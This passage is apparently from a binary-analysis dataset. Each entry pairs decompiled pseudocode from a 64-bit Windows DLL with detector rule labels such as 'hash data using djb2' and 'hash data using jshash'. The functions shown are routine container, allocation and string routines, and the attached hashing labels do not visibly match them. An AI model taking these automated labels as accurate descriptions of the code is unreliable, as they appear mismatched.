        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180017d60(uint32_t **arg1, int64_t *arg2, int64_t *arg3, int64_t *arg4)\n\n{\n    int64_t iVar1;\n    uint32_t *puVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    uint32_t *puVar7;\n    uint32_t *puVar8;\n    uint64_t uVar9;\n    uint32_t *puVar10;\n    uchar auStack120 [32];\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint32_t *var_40h;\n    uint64_t var_38h;\n    uint32_t *var_30h;\n    uint64_t var_28h;\n    uint64_t var_bp_20h;\n    ulong var_18h;\n    ulong var_10h;\n    \n    var_bp_20h = *0x180123080 ^ auStack120;\n    puVar2 = *arg1;\n    puVar8 = arg1[3];\n    var_38h = 0;\n    var_40h = puVar2;\n    if (puVar8 != NULL) {\n        uVar6 = (*arg3 - puVar2 >> 2) * 0x20 + arg3[1];\n        if ((uVar6 < 0) && (uVar6 != 0)) {\n            iVar1 = -((~uVar6 >> 5) * 4 + 4);\n        }\n        else {\n            iVar1 = (uVar6 >> 5) * 4;\n        }\n        var_40h = puVar2 + iVar1;\n        var_38h = uVar6 & 0x1f;\n    }\n    uStack88 = *arg4;\n    uStack84 = *(arg4 + 4);\n    uStack80 = *(arg4 + 1);\n    uStack76 = *(arg4 + 0xc);\n    var_28h = 0;\n    var_30h = puVar2;\n    if (puVar8 != NULL) {\n        uVar6 = (*arg4 - puVar2 >> 2) * 0x20 + arg4[1];\n        if ((uVar6 < 0) && (uVar6 != 0)) {\n            iVar1 = -((~uVar6 >> 5) * 4 + 4);\n        }\n        else {\n            iVar1 = (uVar6 >> 5) * 4;\n        }\n        var_30h = puVar2 + iVar1;\n        var_28h = uVar6 & 0x1f;\n    }\n    uVar6 = (var_40h - puVar2 >> 2) * 0x20 + var_38h;\n    if ((var_40h != var_30h) || (var_38h != var_28h)) {\n        if ((puVar8 < 0) && (puVar8 != NULL)) {\n            iVar1 = -((~puVar8 >> 5) * 4 + 4);\n        }\n        else {\n            iVar1 = (puVar8 >> 5) * 4;\n        }\n        var_30h._4_4_ = var_30h >> 0x20;\n        uStack88 = var_30h._0_4_;\n        uStack84 = var_30h._4_4_;\n        uStack80 = var_28h;\n        uStack76 = 0;\n        uVar5 = var_28h;\n        puVar7 = var_40h;\n        uVar9 = var_38h;\n        puVar10 = var_30h;\n        while ((puVar10 != puVar2 + iVar1 || (uVar5 != (puVar8 & 0x1f)))) {\n            if ((*puVar10 & 1 << (uVar5 & 0x1f)) == 0) {\n                uVar4 = *puVar7 & ~(1 << (uVar9 & 0x1f));\n            }\n            else {\n                uVar4 = *puVar7 | 1 << (uVar9 & 0x1f);\n            }\n            *puVar7 = uVar4;\n            if (uVar9 < 0x1f) {\n                uVar9 = uVar9 + 1;\n            }\n            else {\n                uVar9 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            if (uVar5 < 0x1f) {\n                uVar5 = uVar5 + 1;\n            }\n            else {\n                uVar5 = 0;\n                puVar10 = puVar10 + 1;\n            }\n        }\n        puVar2 = *arg1;\n        puVar8 = (puVar7 - puVar2 >> 2) * 0x20 + uVar9;\n        if (0x7fffffffffffffff < puVar8) {\n            fcn.180015120();\n            pcVar3 = swi(3);\n            (*pcVar3)();\n            return;\n        }\n        uVar5 = puVar8 + 0x1fU >> 5;\n        if (uVar5 < arg1[1] - puVar2 >> 2) {\n            arg1[1] = puVar2 + uVar5;\n        }\n        arg1[3] = puVar8;\n        if ((puVar8 & 0x1f) != 0) {\n            puVar2[uVar5 - 1] = puVar2[uVar5 - 1] & (1 << (puVar8 & 0x1f)) - 1U;\n        }\n    }\n    if ((uVar6 < 0) && (uVar6 != 0)) {\n        iVar1 = -((~uVar6 >> 5) * 4 + 4);\n    }\n    else {\n        iVar1 = (uVar6 >> 5) * 4;\n    }\n    *arg2 = *arg1 + iVar1;\n    arg2[1] = uVar6 & 0x1f;\n    fcn.18008fb00(var_bp_20h ^ auStack120);\n    return;\n}\n",
        "token_count": 1407
    },
    "180017ff": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\nvoid fcn.180017ff0(int64_t *arg1, int64_t *arg2, uint64_t arg3)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uint *puVar7;\n    uint32_t *puVar8;\n    uint *puVar9;\n    uint32_t *puVar10;\n    uchar auStack120 [32];\n    uint auStack88 [4];\n    uint32_t *puStack72;\n    uint64_t uStack64;\n    uint32_t *puStack56;\n    uint64_t uStack48;\n    uint64_t uStack40;\n    \n    uStack40 = *0x180123080 ^ auStack120;\n    iVar5 = *arg1;\n    uVar6 = (*arg2 - iVar5 >> 2) * 0x20 + arg2[1];\n    if (arg3 != 0) {\n        if (0x7fffffffffffffffU - arg1[3] < arg3) {\n            fcn.180015120();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        auStack88[0] = 0;\n        puVar7 = arg1[1];\n        uVar4 = arg1[3] + 0x1f + arg3 >> 5;\n        uVar3 = puVar7 - iVar5 >> 2;\n        if (uVar4 < uVar3) {\n            arg1[1] = iVar5 + uVar4 * 4;\n        }\n        else if (uVar3 < uVar4) {\n            if (arg1[2] - iVar5 >> 2 < uVar4) {\n                fcn.18001b800(arg1, uVar4, auStack88);\n            }\n            else {\n                iVar5 = uVar4 - uVar3;\n                puVar9 = puVar7;\n                if (iVar5 != 0) {\n                    puVar9 = puVar7 + iVar5;\n                    for (; iVar5 != 0; iVar5 = iVar5 + -1) {\n                        *puVar7 = 0;\n                        puVar7 = puVar7 + 1;\n                    }\n                }\n                arg1[1] = puVar9;\n            }\n        }\n        uVar3 = arg1[3];\n        if (uVar3 == 0) {\n            arg1[3] = arg3;\n        }\n        else {\n            iVar5 = *arg1;\n            if ((uVar3 < 0) && (uVar3 != 0)) {\n                iVar1 = -((~uVar3 >> 5) * 4 + 4);\n            }\n            else {\n                iVar1 = (uVar3 >> 5) * 4;\n            }\n            puStack72 = iVar5 + iVar1;\n            arg3 = uVar3 + arg3;\n            arg1[3] = arg3;\n            if ((arg3 < 0) && (arg3 != 0)) {\n                iVar1 = -((~arg3 >> 5) * 4 + 4);\n            }\n            else {\n                iVar1 = (arg3 >> 5) * 4;\n            }\n            puStack56 = iVar5 + iVar1;\n            if ((uVar6 < 0) && (uVar6 != 0)) {\n                iVar1 = -((~uVar6 >> 5) * 4 + 4);\n            }\n            else {\n                iVar1 = (uVar6 >> 5) * 4;\n            }\n            uStack64 = uVar3 & 0x1f;\n            uStack48 = arg3 & 0x1f;\n            uVar3 = uStack64;\n            uVar4 = uStack48;\n            puVar8 = puStack56;\n            puVar10 = puStack72;\n            while ((iVar5 + iVar1 != puVar10 || ((uVar6 & 0x1f) != uVar3))) {\n                if (uVar3 == 0) {\n                    uVar3 = 0x1f;\n                    puVar10 = puVar10 + -1;\n                }\n                else {\n                    uVar3 = uVar3 - 1;\n                }\n                if (uVar4 == 0) {\n                    uVar4 = 0x1f;\n                    puVar8 = puVar8 + -1;\n                }\n                else {\n                    uVar4 = uVar4 - 1;\n                }\n                if ((*puVar10 & 1 << (uVar3 & 0x1f)) == 0) {\n                    *puVar8 = *puVar8 & ~(1 << (uVar4 & 0x1f));\n                }\n                else {\n                    *puVar8 = *puVar8 | 1 << (uVar4 & 0x1f);\n                }\n            }\n        }\n    }\n    fcn.18008fb00(uStack40 ^ auStack120);\n    return;\n}\n",
        "token_count": 1109
    },
    "18002da6": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\nint64_t fcn.18002da60(int64_t *arg1, int64_t arg2)\n\n{\n    return arg2 * 0xa0 + *arg1;\n}\n",
        "token_count": 40
    },
    "18002daa": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\nvoid fcn.18002daa0(int64_t *arg1, uint64_t arg2)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    int64_t arg1_00;\n    int64_t iVar3;\n    \n    iVar2 = arg1[1];\n    iVar3 = *arg1;\n    uVar1 = (iVar2 - iVar3) / 0xa0;\n    if (arg2 < uVar1) {\n        iVar3 = arg2 * 0xa0 + iVar3;\n        for (arg1_00 = iVar3; arg1_00 != iVar2; arg1_00 = arg1_00 + 0xa0) {\n            fcn.1800252e0(arg1_00);\n        }\n        arg1[1] = iVar3;\n        return;\n    }\n    if (uVar1 < arg2) {\n        if ((arg1[2] - iVar3) / 0xa0 < arg2) {\n            fcn.18002fcc0(arg1, arg2);\n            return;\n        }\n        iVar2 = fcn.18002f850(arg1[2] - iVar3, iVar2, arg2 - uVar1);\n        arg1[1] = iVar2;\n    }\n    return;\n}\n",
        "token_count": 281
    },
    "18002df9": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\nvoid fcn.18002df90(int64_t *arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t arg1_00;\n    int64_t iVar3;\n    \n    arg1_00 = *arg1;\n    if (arg1_00 != 0) {\n        iVar3 = arg1[1];\n        if (arg1_00 != iVar3) {\n            do {\n                fcn.1800252e0(arg1_00);\n                arg1_00 = arg1_00 + 0xa0;\n            } while (arg1_00 != iVar3);\n            arg1_00 = *arg1;\n        }\n        uVar2 = ((arg1[2] - arg1_00) / 0xa0) * 0xa0;\n        iVar3 = arg1_00;\n        if (0xfff < uVar2) {\n            iVar3 = *(arg1_00 + -8);\n            if (0x1f < (arg1_00 - iVar3) - 8U) {\n                fcn.1800b3528(arg1[2] - arg1_00, uVar2 + 0x27);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar3);\n        *arg1 = 0;\n        arg1[1] = 0;\n        arg1[2] = 0;\n    }\n    return;\n}\n",
        "token_count": 336
    },
    "18002e1e": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\nvoid fcn.18002e1e0(ulong noname_0, uint64_t arg2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint64_t arg1;\n    int64_t iVar3;\n    uint64_t arg1_00;\n    \n    arg1 = arg2 * 0xa0;\n    if (arg2 < 0x19999999999999a) {\n        if (arg1 < 0x1000) {\n            if (arg1 == 0) {\n                return;\n            }\n            do {\n                iVar3 = fcn.1800b35a0(arg1);\n                if (iVar3 != 0) {\n                    return;\n                }\n                iVar2 = fcn.1800c086c(arg1);\n            } while (iVar2 != 0);\n            if (arg1 == 0xffffffffffffffff) {\n                fcn.180090898();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            fcn.18006df20();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n    }\n    else {\n        arg1 = 0xffffffffffffffff;\n    }\n    arg1_00 = arg1 + 0x27;\n    if (arg1_00 <= arg1) {\n        arg1_00 = 0xffffffffffffffff;\n    }\n    iVar3 = fcn.18008fb2c(arg1_00);\n    if (iVar3 == 0) {\n        fcn.1800b3528();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    *((iVar3 + 0x27U & 0xffffffffffffffe0) - 8) = iVar3;\n    return;\n}\n",
        "token_count": 393
    },
    "18002e26": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\nulong fcn.18002e260(ulong noname_0, int64_t arg2, int64_t arg3)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    uint *puVar5;\n    ulong arg1;\n    \n    iVar3 = arg2;\n    if (0xfff < arg3 * 0xa0) {\n        iVar3 = *(arg2 + -8);\n        if (0x1f < (arg2 - iVar3) - 8U) {\n            fcn.1800b3528(iVar3, arg3 * 0xa0 + 0x27);\n            pcVar1 = swi(3);\n            uVar4 = (*pcVar1)();\n            return uVar4;\n        }\n    }\n    uVar4 = 0;\n    if ((iVar3 != 0) && (arg1 = *0x180129fa0,  uVar4 = (**0x1800de208)(*0x180129fa0, 0, iVar3),  uVar4 == 0)) {\n        puVar5 = fcn.1800ba53c(arg1);\n        uVar2 = (**0x1800de400)();\n        uVar4 = fcn.1800ba484(uVar2);\n        *puVar5 = uVar4;\n    }\n    return uVar4;\n}\n",
        "token_count": 309
    },
    "18002f77": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\nvoid fcn.18002f770(int64_t *arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t arg1_00;\n    int64_t iVar3;\n    \n    arg1_00 = *arg1;\n    if (arg1_00 != 0) {\n        iVar3 = arg1[1];\n        if (arg1_00 != iVar3) {\n            do {\n                fcn.1800252e0(arg1_00);\n                arg1_00 = arg1_00 + 0xa0;\n            } while (arg1_00 != iVar3);\n            arg1_00 = *arg1;\n        }\n        uVar2 = ((arg1[2] - arg1_00) / 0xa0) * 0xa0;\n        iVar3 = arg1_00;\n        if (0xfff < uVar2) {\n            iVar3 = *(arg1_00 + -8);\n            if (0x1f < (arg1_00 - iVar3) - 8U) {\n                fcn.1800b3528(arg1[2] - arg1_00, uVar2 + 0x27);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar3);\n    }\n    *arg1 = arg2;\n    arg1[1] = arg3 * 0xa0 + arg2;\n    arg1[2] = arg4 * 0xa0 + arg2;\n    return;\n}\n",
        "token_count": 366
    },
    "180040e0": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180040e00(void)\n\n{\n    ulong *puVar1;\n    ulong *arg1;\n    code *pcVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int32_t iVar5;\n    uchar *puVar6;\n    ulong *arg2;\n    uchar *arg2_00;\n    int64_t iVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    int32_t iVar10;\n    uint64_t uVar11;\n    uchar auStack264 [32];\n    uchar *puStack232;\n    uchar *puStack224;\n    uchar uStack216;\n    unkbyte7 Stack215;\n    ulong uStack200;\n    uint64_t uStack192;\n    uchar uStack184;\n    unkbyte7 Stack183;\n    ulong uStack168;\n    uint64_t uStack160;\n    uchar uStack152;\n    unkbyte7 Stack151;\n    ulong uStack136;\n    uint64_t uStack128;\n    uchar *puStack120;\n    ulong uStack112;\n    uchar uStack104;\n    unkbyte7 Stack103;\n    ulong uStack88;\n    uint64_t uStack80;\n    uchar auStack72 [16];\n    int64_t iStack56;\n    uint64_t uStack48;\n    \n    uStack112 = 0xfffffffffffffffe;\n    uStack48 = *0x180123080 ^ auStack264;\n    auStack72 = ZEXT816(0);\n    uVar8 = 0;\n    iStack56 = 0;\n    puStack120 = &uStack104;\n    uStack88 = 0;\n    uStack80 = 0xf;\n    uStack104 = 0;\n    fcn.180011120(&uStack104, 0x1800f473e, 0);\n    uStack136 = CONCAT44(*0x180101914, *0x180101910);\n    uStack128 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack152 = 0;\n    fcn.180011120(&uStack152, 0x1800f473f, 0);\n    uStack200 = CONCAT44(*0x180101914, *0x180101910);\n    uStack192 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack216 = 0;\n    fcn.180011120(&uStack216, 0x1800f81f0, 9);\n    uStack168 = CONCAT44(*0x180101914, *0x180101910);\n    uStack160 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack184 = 0;\n    puVar6 = &uStack184;\n    fcn.180011120(puVar6, 0x1800f7b04, 4);\n    puStack224 = &uStack104;\n    puStack232 = &uStack152;\n    iVar5 = fcn.180009a40(puVar6, auStack72, &uStack184, &uStack216);\n    if (uStack160 < 0x10) {\ncode_r0x000180040f46:\n        uStack168 = CONCAT44(*0x180101914, *0x180101910);\n        uStack160 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack184 = 0;\n        if (0xf < uStack192) {\n            iVar3 = CONCAT71(Stack215, uStack216);\n            iVar7 = iVar3;\n            if ((0xfff < uStack192 + 1) && (iVar7 = *(iVar3 + -8),  0x1f < (iVar3 - iVar7) - 8U))\n            goto code_r0x0001800412e1;\n            fcn.18008fb24(iVar7);\n        }\n        uStack200 = CONCAT44(*0x180101914, *0x180101910);\n        uStack192 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack216 = 0;\n        iVar7 = *0x180123ff0;\n        iVar3 = *0x180123ff8;\n        if (0xf < uStack128) {\n            iVar3 = CONCAT71(Stack151, uStack152);\n            iVar7 = iVar3;\n            if ((0xfff < uStack128 + 1) && (iVar7 = *(iVar3 + -8),  0x1f < (iVar3 - iVar7) - 8U))\n            goto code_r0x0001800412e7;\n            fcn.18008fb24(iVar7);\n            iVar7 = *0x180123ff0;\n            iVar3 = *0x180123ff8;\n        }\n        for (; iVar4 = *0x180123ff8,  iVar7 != *0x180123ff8; iVar7 = iVar7 + 0x40) {\n            *0x180123ff8 = iVar3;\n            fcn.180042e30(iVar7);\n            iVar3 = *0x180123ff8;\n            *0x180123ff8 = iVar4;\n        }\n        *0x180123ff8 = *0x180123ff0;\n        fcn.180048c70(0x180123ff0, iVar5);\n        (**0x1800de7f0)(*0x180123fc0, 0x14b, 0, 0);\n        uVar9 = uVar8;\n        uVar11 = uVar8;\n        if (0 < iVar5) {\n            do {\n                puStack120 = &uStack152;\n                uStack136 = 0;\n                uStack128 = 0xf;\n                uStack152 = 0;\n                fcn.180011120(&uStack152, 0x1800f474e, 0);\n                uStack168 = 0;\n                uStack160 = 0xf;\n                uStack184 = 0;\n                fcn.180011120(&uStack184, 0x1800f474f, 0);\n                uStack200 = 0;\n                uStack192 = 0xf;\n                uStack216 = 0;\n                puVar6 = &uStack216;\n                fcn.180011120(puVar6, 0x1800f8200, 9);\n                iVar10 = uVar11;\n                puStack224 = &uStack152;\n                puStack232 = &uStack184;\n                fcn.180004f50(puVar6, &uStack104, iVar10 * 0x20 + auStack72._0_8_, &uStack216);\n                if (0xf < uStack192) {\n                    iVar3 = CONCAT71(Stack215, uStack216);\n                    iVar7 = iVar3;\n                    if ((0xfff < uStack192 + 1) && (iVar7 = *(iVar3 + -8),  0x1f < (iVar3 - iVar7) - 8U))\n                    goto code_r0x0001800412f3;\n                    fcn.18008fb24(iVar7);\n                }\n                uStack200 = 0;\n                uStack192 = 0xf;\n                uStack216 = 0;\n                if (0xf < uStack160) {\n                    iVar3 = CONCAT71(Stack183, uStack184);\n                    iVar7 = iVar3;\n                    if ((0xfff < uStack160 + 1) && (iVar7 = *(iVar3 + -8),  0x1f < (iVar3 - iVar7) - 8U))\n                    goto code_r0x0001800412f9;\n                    fcn.18008fb24(iVar7);\n                }\n                uStack168 = 0;\n                uStack160 = 0xf;\n                uStack184 = 0;\n                arg2 = auStack72._0_8_ + uVar8;\n                iVar7 = iVar10 * 0x40;\n                arg1 = iVar7 + *0x180123ff0;\n                if (arg1 != arg2) {\n                    puVar1 = arg2 + 2;\n                    if (0xf < arg2[3]) {\n                        arg2 = *arg2;\n                    }\n                    fcn.180011120(arg1, arg2, *puVar1);\n                }\n                puVar6 = *0x180123ff0 + 0x20 + iVar7;\n                if (puVar6 != &uStack104) {\n                    arg2_00 = &uStack104;\n                    if (7 < uStack80) {\n                        arg2_00 = CONCAT71(Stack103, uStack104);\n                    }\n                    fcn.180010d70(puVar6, arg2_00, uStack88);\n                }\n                puVar6 = &uStack104;\n                if (7 < uStack80) {\n                    puVar6 = CONCAT71(Stack103, uStack104);\n                }\n                (**0x1800de7f0)(*0x180123fc0, 0x143, 0, puVar6);\n                if (7 < uStack80) {\n                    iVar3 = CONCAT71(Stack103, uStack104);\n                    iVar7 = iVar3;\n                    if (0xfff < uStack80 * 2 + 2) {\n                        iVar7 = *(iVar3 + -8);\n                        if (0x1f < (iVar3 - iVar7) - 8U) {\n                            fcn.1800b3528(iVar7, uStack80 * 2 + 0x29);\n                            goto code_r0x0001800412db;\n                        }\n                    }\n                    fcn.18008fb24(iVar7);\n                }\n                uVar9 = uVar9 + 1;\n                uVar8 = uVar8 + 0x20;\n                uVar11 = iVar10 + 1;\n            } while (uVar9 < iVar5);\n        }\n        if (auStack72._0_8_ != 0) {\n            fcn.180013b30(auStack72._0_8_, auStack72._8_8_);\n            iVar7 = auStack72._0_8_;\n            if ((0xfff < (iStack56 - auStack72._0_8_ & 0xffffffffffffffe0U)) &&\n               (iVar7 = *(auStack72._0_8_ + -8),  0x1f < (auStack72._0_8_ - iVar7) - 8U)) goto code_r0x0001800412ed;\n            fcn.18008fb24(iVar7);\n        }\n        fcn.18008fb00(uStack48 ^ auStack264);\n        return;\n    }\n    iVar3 = CONCAT71(Stack183, uStack184);\n    iVar7 = iVar3;\n    if ((uStack160 + 1 < 0x1000) || (iVar7 = *(iVar3 + -8),  (iVar3 - iVar7) - 8U < 0x20)) {\n        fcn.18008fb24(iVar7);\n        goto code_r0x000180040f46;\n    }\ncode_r0x0001800412db:\n    fcn.1800b3528();\ncode_r0x0001800412e1:\n    fcn.1800b3528();\ncode_r0x0001800412e7:\n    fcn.1800b3528();\ncode_r0x0001800412ed:\n    fcn.1800b3528();\ncode_r0x0001800412f3:\n    fcn.1800b3528();\ncode_r0x0001800412f9:\n    fcn.1800b3528();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 2600
    },
    "1800434a": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1800434a0(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t arg2_00;\n    uchar auStack120 [32];\n    int64_t *piStack88;\n    ulong uStack80;\n    int64_t *piStack72;\n    uchar auStack64 [16];\n    int64_t *piStack48;\n    uint64_t uStack40;\n    \n    uStack80 = 0xfffffffffffffffe;\n    uStack40 = *0x180123080 ^ auStack120;\n    piStack88 = arg1;\n    piStack72 = arg1;\n    fcn.18000de50(arg1, arg2);\n    fcn.18000da90(arg1 + 4, arg2 + 0x20);\n    *(arg1 + 8) = *(arg2 + 0x40);\n    piVar1 = arg1 + 9;\n    *piVar1 = 0;\n    arg1[10] = 0;\n    arg1[0xb] = 0;\n    arg2_00 = *(arg2 + 0x48);\n    iVar2 = *(arg2 + 0x50);\n    if (arg2_00 != iVar2) {\n        iVar3 = iVar2 - arg2_00;\n        iVar4 = iVar3 / 6 + (iVar3 >> 0x3f);\n        iVar4 = (iVar4 >> 4) - (iVar4 >> 0x3f);\n        iVar3 = fcn.180048fa0(iVar3, iVar4);\n        *piVar1 = iVar3;\n        arg1[10] = iVar3;\n        arg1[0xb] = iVar4 * 0x60 + iVar3;\n        iVar3 = *piVar1;\n        auStack64 = CONCAT88(iVar3, iVar3);\n        piStack88 = piVar1;\n        piStack48 = piVar1;\n        do {\n            fcn.180043fe0(iVar3, arg2_00);\n            iVar3 = iVar3 + 0x60;\n            auStack64 = CONCAT88(iVar3, auStack64._0_8_);\n            arg2_00 = arg2_00 + 0x60;\n        } while (arg2_00 != iVar2);\n        arg1[10] = iVar3;\n    }\n    fcn.18008fb00(uStack40 ^ auStack120);\n    return;\n}\n",
        "token_count": 571
    },
    "180048b1": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\nvoid fcn.180048b10(int64_t *arg1, uint64_t arg2)\n\n{\n    ulong *puVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uchar *arg1_00;\n    int64_t iVar6;\n    \n    puVar4 = arg1[1];\n    iVar6 = *arg1;\n    iVar3 = (puVar4 - iVar6) / 6 + (puVar4 - iVar6 >> 0x3f);\n    uVar2 = (iVar3 >> 4) - (iVar3 >> 0x3f);\n    if (arg2 < uVar2) {\n        puVar5 = arg2 * 0x60 + iVar6;\n        for (arg1_00 = puVar5; arg1_00 != puVar4; arg1_00 = arg1_00 + 0x60) {\n            fcn.180048ec0(arg1_00 + 0x48);\n            fcn.180042e30(arg1_00);\n        }\n        arg1[1] = puVar5;\n        return;\n    }\n    if (uVar2 < arg2) {\n        if ((arg1[2] - iVar6) / 0x60 < arg2) {\n            fcn.180049ac0(arg1, arg2);\n            return;\n        }\n        iVar6 = arg2 - uVar2;\n        if (iVar6 != 0) {\n            puVar1 = puVar4 + 0x38;\n            do {\n                *(puVar4 + 1) = ZEXT816(0);\n                *(puVar4 + 0x11) = ZEXT816(0);\n                *(puVar4 + 0x21) = ZEXT816(0);\n                *(puVar4 + 0x31) = ZEXT816(0);\n                *(puVar4 + 0x41) = ZEXT816(0);\n                *(puVar4 + 0x51) = 0;\n                *(puVar4 + 0x59) = 0;\n                *(puVar4 + 0x5d) = 0;\n                puVar4[0x5f] = 0;\n                *puVar4 = 0;\n                puVar4 = puVar4 + 0x60;\n                puVar1[-5] = 0;\n                puVar1[-4] = 0xf;\n                puVar1[-1] = 0;\n                *puVar1 = 7;\n                *(puVar1 + -3) = 0;\n                *(puVar1 + 1) = 0;\n                *(puVar1 + 0xc) = 0;\n                puVar1[2] = 0;\n                puVar1[3] = 0;\n                puVar1[4] = 0;\n                iVar6 = iVar6 + -1;\n                puVar1 = puVar1 + 0xc;\n            } while (iVar6 != 0);\n        }\n        arg1[1] = puVar4;\n    }\n    return;\n}\n",
        "token_count": 688
    },
    "180048db": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\nvoid fcn.180048db0(int64_t *arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t arg1_00;\n    int64_t iVar3;\n    \n    arg1_00 = *arg1;\n    if (arg1_00 != 0) {\n        iVar3 = arg1[1];\n        if (arg1_00 != iVar3) {\n            do {\n                fcn.180048ec0(arg1_00 + 0x48);\n                fcn.180042e30(arg1_00);\n                arg1_00 = arg1_00 + 0x60;\n            } while (arg1_00 != iVar3);\n            arg1_00 = *arg1;\n        }\n        uVar2 = ((arg1[2] - arg1_00) / 0x60) * 0x60;\n        iVar3 = arg1_00;\n        if (0xfff < uVar2) {\n            iVar3 = *(arg1_00 + -8);\n            if (0x1f < (arg1_00 - iVar3) - 8U) {\n                fcn.1800b3528(arg1[2] - arg1_00, uVar2 + 0x27);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar3);\n        *arg1 = 0;\n        arg1[1] = 0;\n        arg1[2] = 0;\n    }\n    return;\n}\n",
        "token_count": 353
    },
    "180048f5": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\nulong fcn.180048f50(ulong noname_0, int64_t arg2, int64_t arg3)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    uint *puVar5;\n    ulong arg1;\n    \n    iVar3 = arg2;\n    if (0xfff < arg3 * 0x60) {\n        iVar3 = *(arg2 + -8);\n        if (0x1f < (arg2 - iVar3) - 8U) {\n            fcn.1800b3528(iVar3, arg3 * 0x60 + 0x27);\n            pcVar1 = swi(3);\n            uVar4 = (*pcVar1)();\n            return uVar4;\n        }\n    }\n    uVar4 = 0;\n    if ((iVar3 != 0) && (arg1 = *0x180129fa0,  uVar4 = (**0x1800de208)(*0x180129fa0, 0, iVar3),  uVar4 == 0)) {\n        puVar5 = fcn.1800ba53c(arg1);\n        uVar2 = (**0x1800de400)();\n        uVar4 = fcn.1800ba484(uVar2);\n        *puVar5 = uVar4;\n    }\n    return uVar4;\n}\n",
        "token_count": 309
    },
    "180048fa": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
